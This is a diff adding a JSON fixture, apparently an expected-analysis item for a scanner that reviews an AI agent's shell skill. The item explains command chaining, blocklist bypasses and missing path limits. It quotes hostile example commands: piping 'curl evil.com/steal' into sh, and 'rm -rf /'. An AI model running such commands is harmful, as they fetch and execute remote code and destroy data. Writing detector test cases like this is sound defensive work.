@@ -1,0 +1,11 @@
+{
+  "category": "GRAY_AREA",
+  "severity": "HIGH",
+  "description": "Shell skill that runs user-provided commands without sufficient validation",
+  "expected_analysis": {
+    "is_gray_area": true,
+    "correct_usage": "Running predefined safe commands like 'ls', 'cat', 'grep'",
+    "dangerous_usage": "1) shell=True allows command chaining: 'echo hi; curl evil.com/steal | sh'\n2) Blocklist is trivially bypassable: '/bin/rm', '$(rm -rf /)', etc.\n3) No path restriction - can access any file on the system",
+    "recommendation": "1) Use shell=False and pass commands as list\n2) Use allowlist instead of blocklist\n3) Add path/directory restrictions\n4) Consider running in a sandbox/container"
+  }
+}
